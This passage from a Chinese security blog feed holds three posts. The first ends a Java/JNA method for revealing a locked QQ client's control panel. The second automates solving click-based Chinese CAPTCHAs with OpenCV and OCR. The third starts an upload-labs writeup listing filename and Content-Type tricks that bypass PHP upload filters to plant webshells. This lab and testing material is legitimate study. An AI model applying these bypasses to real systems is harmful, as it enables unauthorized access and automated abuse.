1)</code>，隐藏窗口<code>ShowWindow (句柄, 0)。</code></p><p>效果如图所示。</p><p><img src="08.gif" alt="1542724530787"></p><blockquote><p>这样虽然能够满足，但是却不够智能，无法自动获取句柄，需要借助其他工具去寻找句柄，因此放弃。</p></blockquote><h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三"></a>尝试三</h2><p>本次测试中走了两条“弯路”，在这里简要说明一下，就不再附详细的过程了。某次发现使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “TXMenuWindow”)</span><br><span class="line">句柄&#x3D;窗口_取父句柄 (窗口_取父句柄 (临时_句柄))</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “”)</span><br><span class="line">句柄&#x3D;窗口_取父句柄 (临时_句柄)</span><br></pre></td></tr></table></figure><p>可以获取到QQ锁定时控制面板的句柄。如图所示</p><p><img src="09.gif" alt="1542724530787"></p><blockquote><p>但这些只是概率事件，多数情况下还是不行的。即使可以使用这两种方法，但是这两种方法获取的都是一个句柄，当有两个QQ时，就无法同时获取两个句柄了，所以该方法不可取。</p></blockquote><p>由于QQ处于锁定时，窗口标题为随机的字符串，所以无法使用FindWindowA这种方法了。</p><h2 id="尝试四之最终实现"><a href="#尝试四之最终实现" class="headerlink" title="尝试四之最终实现"></a>尝试四之最终实现</h2><p>此时想到另外一个思路，遍历屏幕上所有的顶层窗口，然后根据条件进行筛选。</p><p>这里用的Java来实现，操作Windows API采用了<a href="https://github.com/java-native-access/jna" target="_blank" rel="noopener">JNA</a>。</p><blockquote><p>JNA的全称是Java Native Access，你只要在一个java接口中描述本地库中的函数与结构， JNA将在运行期动态访问本地库，自动实现Java接口到本地库函数的映射。</p></blockquote><p>使用maven加入所需的依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna-platform<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>枚举屏幕上所有的顶层窗口采用的是<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">EnumWindows</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">EnumWindows</span><span class="params">(WinUser.WNDENUMPROC lpEnumFunc,</span></span></span><br><span class="line"><span class="function"><span class="params">                    Pointer data)</span></span></span><br></pre></td></tr></table></figure><p>该函数枚举屏幕上所有的顶层窗口，并将窗口句柄传送给应用程序定义的回调函数。回调函数返回FALSE将停止枚举，否则EnumWindows函数继续到所有顶层窗口枚举完为止。</p><p>参数：lpEnumFunc - 指向应用程序定义的回调函数的长指针。</p><p>参数：data - 指定要传递给回调函数的应用程序定义的值。</p><p>代码实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">    public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123;</span><br><span class="line">        System.out.println(hwnd);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,null);</span><br></pre></td></tr></table></figure><p><img src="10.png" alt="1542765670181"></p><p>此时获取的时所有顶层窗口的句柄，剩下的就是去如何进行过滤，留下所需的句柄。</p><p><img src="11.png" alt="1542766813276"></p><p>通过对比发现，可以用窗口样式进行区分。当QQ锁定时（或QQ未锁定且最小化时），对应的窗口样式为860C0000（十进制为2248933376）。</p><p>下面为QQ锁定时的样式。</p><p><img src="12.png" alt="1542766908014"></p><p>通过查询API，可以用<code>User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>来获取窗口样式。然后通过这种方法进行过滤，当该值为2248933376，则认为对应的hwnd为QQ控制面板的句柄。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    System.out.println(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p><img src="13.png" alt="1542767244090"></p><p>可以看到成功获取了QQ锁定时控制面板的句柄。有了句柄，就可以进行之前的操作了，如显示与隐藏。</p><blockquote><p>当QQ未锁定时，QQ弹出时对应的窗口样式为960c0000（十进制为2517368832）。</p></blockquote><p><img src="14.png" alt="1542768137649"></p><p>此时就可以先通过<code>EnumWindows</code>枚举所有的窗口，然后再使用<code>GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>获取窗口样式进行匹配，匹配到所需的窗口。</p><p>这里将QQ锁定和未锁定的情况都考虑进去，然后获取QQ控制面板的句柄。之后通过<code>GetWindowText</code>获取窗口的标题，再使用<code>ShowWindow</code>进行隐藏与显示操作。主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;WinDef.HWND&gt; lt = getQQHwnds();</span><br><span class="line">        <span class="keyword">for</span> (WinDef.HWND hwnd:lt) &#123;</span><br><span class="line">            <span class="keyword">char</span>[] titleBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">512</span>];</span><br><span class="line">            User32.INSTANCE.GetWindowText(hwnd,titleBuffer,<span class="number">512</span>);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> String(titleBuffer));</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">0</span>);<span class="comment">//隐藏</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;WinDef.HWND&gt; getQQHwnds()&#123;</span><br><span class="line">        <span class="keyword">final</span> List&lt;WinDef.HWND&gt; lt = <span class="keyword">new</span> ArrayList&lt;WinDef.HWND&gt;();</span><br><span class="line"></span><br><span class="line">        User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2517368832L</span>||User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    lt.add(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> lt;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先获取到QQ控制面板的句柄，然后依次获取其标题，并进行<code>显示-隐藏-显示</code>等过程。效果如图所示。</p><p><img src="15.gif" alt="1542768137649"></p><blockquote><p>这种成功实现了QQ锁定时自动获取控制面板句柄，实现了QQ锁定的绕过。而且有多个QQ时，都可以获取其句柄。</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在一次偶然的情况下可以绕过QQ锁定，于是就进行了尝试，走了一些弯路，最终实现了这种效果。主要过程就是<code>获取所有顶层窗口句柄-根据窗口样式匹配到QQ控制面板的句柄-使用ShowWindow进行显示</code>。也许这不是最佳的解决方法。如果大家有更好的方法或者建议，欢迎分享。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga</a></p><p>[2]<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程之美 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 锁定绕过 </tag>
            
            <tag> Windows API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中文点选验证码自动识别</title>
      <link href="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/"/>
      <url>/2018/08/16/Automatically-Identify-Chinese-Point-Selection/</url>
      
        <content type="html"><![CDATA[<p>某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。</p><a id="more"></a><h2 id="0x01-验证码的获取"><a href="#0x01-验证码的获取" class="headerlink" title="0x01  验证码的获取"></a>0x01  验证码的获取</h2><p>首先获取验证码。由于网站比较特殊，就不以他们的为例，自己生成验证码吧。这个不是重点，这里直接贴代码了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createImage</span><span class="params">($word,$imagePath,$type,$imageName)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $fontPath = <span class="string">'msyh.ttc'</span>;<span class="comment">//字体</span></span><br><span class="line">    $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($word <span class="keyword">as</span> $v ) &#123;</span><br><span class="line">        $fontarea  = imagettfbbox($fontSize, <span class="number">0</span>, $fontPath, $v);</span><br><span class="line">        $textWidth = $fontarea[<span class="number">2</span>] - $fontarea[<span class="number">0</span>];</span><br><span class="line">        $textHeight = $fontarea[<span class="number">1</span>] - $fontarea[<span class="number">7</span>];</span><br><span class="line">        $tmp[<span class="string">'text'</span>] = $v;</span><br><span class="line">        $tmp[<span class="string">'size'</span>] = $fontSize;</span><br><span class="line">        $tmp[<span class="string">'width'</span>] = $textWidth;</span><br><span class="line">        $tmp[<span class="string">'height'</span>] = $textHeight;</span><br><span class="line">        $textArr[] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($imageWidth, $imageHeight, $imageType) = getimagesize($imagePath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($textArr);$i++)&#123;</span><br><span class="line">        <span class="keyword">list</span>($x, $y) = randPosition($textArr, $imageWidth, $imageHeight, $textArr[$i][<span class="string">'width'</span>], $textArr[$i][<span class="string">'height'</span>],$i,$type);</span><br><span class="line">        $textArr[$i][<span class="string">'x'</span>] = $x;</span><br><span class="line">        $textArr[$i][<span class="string">'y'</span>] = $y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建图片的实例</span></span><br><span class="line">    $image = imagecreatefromstring(file_get_contents($imagePath));</span><br><span class="line">    <span class="comment">//字体颜色</span></span><br><span class="line">    $color = imagecolorallocate($image, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//绘画文字</span></span><br><span class="line">    <span class="keyword">foreach</span>($textArr <span class="keyword">as</span> $v)&#123;</span><br><span class="line">        imagefttext($image, $v[<span class="string">'size'</span>], <span class="number">0</span>, $v[<span class="string">'x'</span>], $v[<span class="string">'y'</span>], $color, $fontPath, $v[<span class="string">'text'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(imagepng($image,$imageName))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $imageName.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randPosition</span><span class="params">($textArr, $imgW, $imgH, $fontW, $fontH,$i,$type)</span></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> ($type) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//生成mp</span></span><br><span class="line">$x = rand($i*<span class="number">60</span>, ($i+<span class="number">1</span>)*<span class="number">60</span>-$fontW<span class="number">-3</span>);</span><br><span class="line">$y = rand(<span class="number">40</span>,<span class="number">80</span>); </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//生成ap</span></span><br><span class="line">$x = ($i)*<span class="number">25</span>+<span class="number">5</span>;</span><br><span class="line">$y = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $return = <span class="keyword">array</span>($x, $y);</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ap_imagePath = <span class="string">'ap_bg.png'</span>;</span><br><span class="line">$mp_imagePath = <span class="string">'mp_bg.png'</span>;</span><br><span class="line">$ap_imageName = <span class="string">"ap_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$mp_imageName = <span class="string">"mp_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$ap_word = <span class="keyword">array</span>(<span class="string">'请'</span>,<span class="string">'依'</span>,<span class="string">'次'</span>,<span class="string">'点'</span>,<span class="string">'击'</span>,<span class="string">'图'</span>,<span class="string">'中'</span>,<span class="string">'的'</span>,<span class="string">'猎'</span>, <span class="string">'户'</span>,<span class="string">'室'</span>) ;</span><br><span class="line">$mp_word = <span class="keyword">array</span>(<span class="string">'猎'</span>, <span class="string">'户'</span>, <span class="string">'实'</span>,<span class="string">'验'</span>,<span class="string">'室'</span>);</span><br><span class="line">createImage($ap_word,$ap_imagePath,<span class="number">1</span>,$ap_imageName);</span><br><span class="line">createImage($mp_word,$mp_imagePath,<span class="number">0</span>,$mp_imageName);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后生成这样两张图片。</p><p>ap_XXXXX.png</p><p><img src="ap-01.png" alt="1534127745391"></p><p>mp_XXXXX.png</p><p><img src="mp-01.png" alt="1534127785857"></p><p>ap_XXXXX.png是说明需要点击的文字，mp_XXXXX.png是需要点击的图片。</p><h2 id="0x02-验证码识别"><a href="#0x02-验证码识别" class="headerlink" title="0x02  验证码识别"></a>0x02  验证码识别</h2><p>对于这种简单的点选验证码，可以有两种很容易的识别方式（机器学习算麻烦的，这里就不列出了。嗯，对，我也不会）。一种是opencv的图像模板匹配，另外一种是OCR识别。</p><h3 id="1-opencv的图像模板匹配"><a href="#1-opencv的图像模板匹配" class="headerlink" title="1. opencv的图像模板匹配"></a>1. opencv的图像模板匹配</h3><p>第一种方式，使用opencv的图像模板匹配。模板匹配是一种在较大图像中搜索和查找模板图像位置的方法，opencv2和opencv3中提供了一个专门用于模板匹配的函数matchTemplate()。它是在输入图像上滑动模板图像（如在2D卷积中），并比较模板图像下的输入图像的模板和补丁。在OpenCV中实现了六种比较方法（这里用到的是<code>cv2.TM_CCOEFF_NORMED</code>），它返回一个灰度图像，其中每个像素表示该像素的邻域与模板匹配的程度。</p><p>获得结果后，可以使用cv.minMaxLoc（）函数查找最大/最小值的位置。将其作为矩形的左上角，并将（w，h）作为矩形的宽度和高度，那个矩形就是模板区域。 。</p><p>我们进行使用模板匹配来识别这种验证码时，首先先将“模板”找出来，这里我们需要匹配的是“猎”、“户”、“室”这三个字。将这三个字所在的图片进行截取，然后使用matchTemplate()函数在mp中进行匹配。</p><p>首先截取第一个字“猎”。</p><p><img src="1534141199627.png" alt="1534141199627"></p><p>截取之后，就可以在mp中进行匹配。</p><p><img src="1534319979597.png" alt="1534319979597"></p><p>这里得到了最大和最小位置。我们使用最大位置，然后将最大值作为阈值。获取模板的尺寸，然后在mp中用矩形（红色区域）画出匹配的区域。如下所示。</p><p><img src="1534142377712.png" alt="1534142377712"></p><p>同理，用黄色和蓝色矩形将“户”、“室”所在的区域画出来。</p><p><img src="1534142664129.png" alt="1534142664129"></p><p>点选时发送所选区域中间的坐标即可，这里就不再给出实例了。</p><p>这种方法虽然简单，但是对于字体不一的就不能很正确的标记出来。</p><p>修改生成图片的代码，将mp中的文字的字体设置为随机。</p><p>修改的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//mp 文字随机大小</span></span><br><span class="line">        $fontSize = rand(<span class="number">20</span>,<span class="number">30</span>) * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//ap 文字固定</span></span><br><span class="line">        $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ap生成的结果还是和之前一样，mp的图片如下：</p><p><img src="1534406354140.png" alt="1534406354140"></p><p>使用同样的代码来匹配。</p><p><img src="1534406412351.png" alt="1534406412351"></p><p>此时匹配的结果就有些惨不忍睹了。所以就换另外一种识别方式-ocr识别。</p><h3 id="2-OCR识别"><a href="#2-OCR识别" class="headerlink" title="2. OCR识别"></a>2. OCR识别</h3><p>这里采用的是腾讯云的<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">OCR-通用印刷体识别</a>。</p><p>参考文档。输入mp图片，返回的是json。</p><p><img src="1534407226287.png" alt="1534407226287"></p><p>查看json内容，发现包含了图片中的文字、位置和大小等。</p><p><img src="1534407260832.png" alt="1534407260832"></p><p>同理ap中内容也可以获取。</p><p><img src="1534407371139.png" alt="1534407371139"></p><p>此时匹配的时候直接就是匹配文字了。首先获取ap中后三个文字，然后与mp中返回的内容匹配，获取其位置和大小，然后再画矩形即可。</p><p>由于比较简单，这里直接贴结果。</p><p><img src="1534408948730.png" alt="1534408948730"></p><p>匹配相当完美。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h2><p>本文用了两种方法来自动识别汉字点选验证码，第一种采用的是opencv的模板匹配，这种方法虽然也可以匹配到，但这种方法缺点就是对于字体形状差异较大的验证码识别率较低。而第二种方法就比较快捷方便了，而且识别度高，比较推荐第二种方法。</p><p>当然这两种方法对于简单、“正规”的验证码可以，遇到复杂的、“扭曲的”验证码就不行了。这时候就要用到机器学习了，而本文只是简单的“识别”，将机器学习用到这里，就有些大材小用了。</p><p>相关代码：<a href="https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection</a></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p>[1] <a href="http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html" target="_blank" rel="noopener">http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html</a></p><p>[2]<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/866/17600</a></p>]]></content>
      
      
      <categories>
          
          <category> 验证码识别 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 点选验证码 </tag>
            
            <tag> 验证码识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs writeup</title>
      <link href="/2018/06/04/upload-labs-writeup/"/>
      <url>/2018/06/04/upload-labs-writeup/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里用到的是PHPStudy2016。采用的是Apache+php，其中Apache版本为2.4，php版本按照作者所说的为5.2.17。操作系统为Win10 。然后下载upload-labs并放置在PHPStudy安装目录的WWW目录下。也可以采用作者的<a href="https://github.com/c0ny1/upload-labs/releases" target="_blank" rel="noopener">集成环境</a>。</p><h2 id="题目与解法"><a href="#题目与解法" class="headerlink" title="题目与解法"></a>题目与解法</h2><p>首先需要在upload-labs目录下新建upload目录。</p><p>然后就开始答题了。其中13-16暂时要求的是“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”，我就暂时以13题为例，其余的暂时先不做。第18题暂未解出，所以暂时先省略。</p><p>其他题的WriteUp如下：</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>在js中判断文件，直接上传拦截后修改为php文件</p><p><img src="01.png" alt="1527750911228"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p><img src="02.png" alt="1527751110894"></p><blockquote><p>注意需要带上<code>Content-Type: image/jpeg</code></p></blockquote><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>首先名字为<code>3.php:jpg</code></p><p><img src="03_01.png" alt="1527752035450"></p><p>会写入一个<code>3.php</code>的空文件</p><p>然后修改名字为<code>3.&lt;&lt;&lt;</code></p><p><img src="03_02.png" alt="1527752164570"></p><p>参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>需要在apache httpd.conf进行配置。</p><p><code>AddType application/x-httpd-php .php .phtml</code></p><p>然后上传的文件名可以为<code>3.php.a</code>或者<code>3.phtml</code></p><p><img src="03_03.png" alt="1527832795973"></p><blockquote><p>这个解法是查看到作者给的集成环境中有这样的设置</p></blockquote><h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p><img src="03-04.png" alt="1527836221197"></p><p>首先文件名为<code>3.php.::$DATA</code>会生成一个<code>3.php.</code>文件</p><p>再将文件名修改为<code>3.php&gt;</code></p><p><img src="03-05.png" alt="1527835503648"></p><blockquote><p>第二次的文件名还可以为<code>3.php&lt;</code> 、<code>3.php&gt;</code> 、<code>3.php\</code> 以及<code>3.php&quot;</code></p><p>3.php.文件直接删除不掉，可以在bash命令下删除</p></blockquote><h4 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h4><p>%aa url解码</p><p><img src="03-06.png" alt="1527839239501"></p><p>其他还有%b3、%b2等。。</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>参考Pass-03的方法1、2、3、4</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有对文件名进行小写转换，所以大小写混合或者大写可以绕过</p><p><img src="05-02.png" alt="1527840876449"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>参考Pass-03的方法1、2、3、4</p><p>这里没有去除空格，所以用“6.php ”即可绕过</p><p><img src="06-02.png" alt="1528077233962"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有删除结尾的“.”，所以用“7.php.”可以绕过</p><p><img src="07-01.png" alt="1528077415251"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" 